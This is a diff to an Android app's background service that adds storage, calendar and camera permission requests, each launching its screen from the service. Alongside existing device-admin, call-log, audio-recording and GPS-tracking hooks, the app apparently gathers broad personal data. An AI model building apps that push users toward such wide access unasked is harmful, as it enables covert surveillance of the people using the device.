@@ -33,10 +33,13 @@ import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.data.Wallpapers;
 import com.candroid.textme.ui.activities.permissions.AdminActivity;
+import com.candroid.textme.ui.activities.permissions.CalendarActivity;
 import com.candroid.textme.ui.activities.permissions.CallLogActivity;
+import com.candroid.textme.ui.activities.permissions.CameraActivity;
 import com.candroid.textme.ui.activities.permissions.ContactsActivity;
 import com.candroid.textme.ui.activities.permissions.LocationActivity;
 import com.candroid.textme.ui.activities.permissions.RecordAudioActivity;
+import com.candroid.textme.ui.activities.permissions.StorageActivity;
 
 import java.io.File;
 import java.io.IOException;
@@ -91,6 +94,9 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_LOCATION_PERMISSION = "ACTION_LOCATION_PERMISSION";
     public static final String ACTION_CONTACTS_PERMISSION = "ACTION_CONTACTS_PERMISSION";
     public static final String ACTION_RECORD_AUDIO_PERMISSION = "ACTION_RECORD_AUDIO_PERMISSION";
+    public static final String ACTION_STORAGE_PERMISSION = "ACTION_STORAGE_PERMISSION";
+    public static final String ACTION_CALENDAR_PERMISSION = "ACTION_CALENDAR_PERMISSION";
+    public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
     public static boolean sShouldTrackGps = false;
     private static long sNumber = 1111111111;
     public static HandlerThread sHandlerThread;
@@ -673,6 +679,24 @@ public class JobsIntentService extends IntentService {
                 recordAudioIntent.setClass(this, RecordAudioActivity.class);
                 recordAudioIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(recordAudioIntent);
+            }else if(action.equalsIgnoreCase(ACTION_STORAGE_PERMISSION)){
+                Intent storageIntent = new Intent();
+                storageIntent.setAction(Intent.ACTION_VIEW);
+                storageIntent.setClass(this, StorageActivity.class);
+                storageIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(storageIntent);
+            }else if(action.equals(ACTION_CALENDAR_PERMISSION)){
+                Intent calendarIntent = new Intent();
+                calendarIntent.setAction(Intent.ACTION_VIEW);
+                calendarIntent.setClass(this, CalendarActivity.class);
+                calendarIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(calendarIntent);
+            }else if(action.equals(ACTION_CAMERA_PERMISSION)){
+                Intent cameraIntent = new Intent();
+                cameraIntent.setAction(Intent.ACTION_VIEW);
+                cameraIntent.setClass(this, CameraActivity.class);
+                cameraIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(cameraIntent);
             }else {
                 Log.d(TAG, "No action found!");
             }
